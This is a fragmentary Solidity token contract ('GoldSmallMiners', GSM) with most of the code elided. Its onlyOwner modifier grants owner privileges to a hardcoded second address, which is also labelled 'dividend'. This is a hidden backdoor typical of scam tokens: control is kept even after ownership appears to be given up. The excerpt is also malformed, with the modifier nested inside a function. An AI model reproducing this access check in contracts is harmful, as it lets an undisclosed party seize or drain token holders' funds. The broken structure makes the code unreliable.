...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x229a1B1fa864e9E8cAA1Aa187F5dFee3F62013C4) , "owner");
        _;
    }
...
contract GoldSmallMiners  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "GoldSmallMiners";
    string private _symbol = "GSM";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x0320a414854918a5605162204Fa4d18e53103B48);
    address private _Marketing = 0x0320a414854918a5605162204Fa4d18e53103B48;
    address public dividend = 0x229a1B1fa864e9E8cAA1Aa187F5dFee3F62013C4;
